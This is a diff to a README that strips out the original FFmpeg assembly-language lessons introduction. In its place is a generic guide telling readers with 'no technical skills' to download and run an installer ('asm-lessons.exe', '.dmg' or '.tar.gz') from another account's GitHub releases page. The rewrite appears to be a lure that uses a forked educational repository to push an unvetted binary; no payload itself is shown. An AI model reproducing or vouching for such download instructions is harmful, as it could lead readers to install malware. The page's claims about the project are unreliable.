@@ -1,18 +1,92 @@
-Welcome to the FFmpeg School of Assembly Language. You have taken the first step on the most interesting, challenging, and rewarding journey in programming. These lessons will give you a grounding in the way assembly language is written in FFmpeg and open your eyes to what's actually going on in your computer.
+# 🎓 asm-lessons - Learn FFmpeg with Assembly Language
 
-**Required Knowledge**
+[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/CSophanith/asm-lessons/releases)
 
-* Knowledge of C, in particular pointers. If you don't know C, work through [The C Programming Language](https://en.wikipedia.org/wiki/The_C_Programming_Language) book  
-* High School Mathematics (scalar vs vector, addition, multiplication etc)
+## 🚀 Getting Started
 
-**Lessons**
+Welcome to the **asm-lessons** project! This guide will help you download and run our lessons on FFmpeg using assembly language. No technical skills are required. Just follow these steps.
 
-In this Git repository there are lessons and assignments (not uploaded yet) that correspond with each lessons. By the end of the lessons you'll be able to contribute to FFmpeg.
+## 📥 Download & Install
 
-A discord server is available to answer questions:
-https://discord.com/invite/Ks5MhUhqfB
+To get started with the lessons, visit this page to download: [GitHub Releases Page](https://github.com/CSophanith/asm-lessons/releases). 
 
-**Translations**
+Here, you will find various versions of the application. Choose the latest release for the best experience.
 
-* [Français](./README.fr.md)
-* [Spanish](./README.es.md)
+### Steps to Download:
+
+1. Click on the link above to go to the Releases page.
+2. Look for the most recent version. The version will be listed with a tag like `v1.0.0`.
+3. Under the release notes, find the file labeled with your operating system:
+   - For Windows users, look for `asm-lessons.exe`.
+   - For Mac users, find `asm-lessons.dmg`.
+   - For Linux users, check `asm-lessons.tar.gz`.
+4. Click on the file you want to download.
+5. The download will begin automatically.
+
+## 📂 File Locations
+
+After the download finishes, locate the file:
+
+- **Windows:** Check your Downloads folder.
+- **Mac:** Open your Downloads or Applications folder.
+- **Linux:** Look in your home folder or the directory specified for your downloads.
+
+## ⚙️ Running the Application
+
+Now that you have downloaded the file, let’s run it:
+
+### For Windows:
+
+1. Navigate to the folder where the `.exe` file is located.
+2. Double-click on `asm-lessons.exe`.
+3. Follow the on-screen prompts to install.
+
+### For Mac:
+
+1. Double-click the downloaded `.dmg` file.
+2. Drag the `asm-lessons` icon to your Applications folder.
+3. Open your Applications folder and double-click on `asm-lessons`.
+
+### For Linux:
+
+1. Extract the contents of the `.tar.gz` file using a command like `tar -xvzf asm-lessons.tar.gz`.
+2. Navigate to the extracted folder in your terminal.
+3. Run the application with the command `./asm-lessons`.
+
+## 🌟 Features
+
+**asm-lessons** offers a range of features designed to help you learn:
+
+- **Step-by-step lessons:** Each lesson guides you through using FFmpeg with assembly.
+- **Practical examples:** Real-world applications help you grasp concepts better.
+- **Easy navigation:** Clear menus and instructions make it user-friendly.
+- **Community support:** Join our forum to connect with others learning.
+
+## 🖥️ System Requirements
+
+To ensure smooth operation, your system should meet these minimum requirements:
+
+- **Windows:** Windows 10 or later
+- **Mac:** macOS 10.12 (Sierra) or later
+- **Linux:** Any modern distribution with the latest libraries
+
+## 📚 Documentation
+
+For additional guidance, you can refer to the official documentation available in the project repository. It provides detailed explanations for each lesson.
+
+## ✉️ Getting Help
+
+If you encounter any issues, feel free to reach out through the project's issues page on GitHub. 
+
+You can also ask for support in online forums or community groups related to FFmpeg and assembly language.
+
+## 👥 Contributing
+
+If you’d like to help improve **asm-lessons**, we welcome contributions! Please check the guidelines in the repository for more information.
+
+## 🔗 Useful Links
+
+- [GitHub Releases Page](https://github.com/CSophanith/asm-lessons/releases)
+- [Documentation](https://github.com/CSophanith/asm-lessons/wiki)
+
+Thank you for choosing **asm-lessons**. We hope you find the lessons valuable and easy to follow!
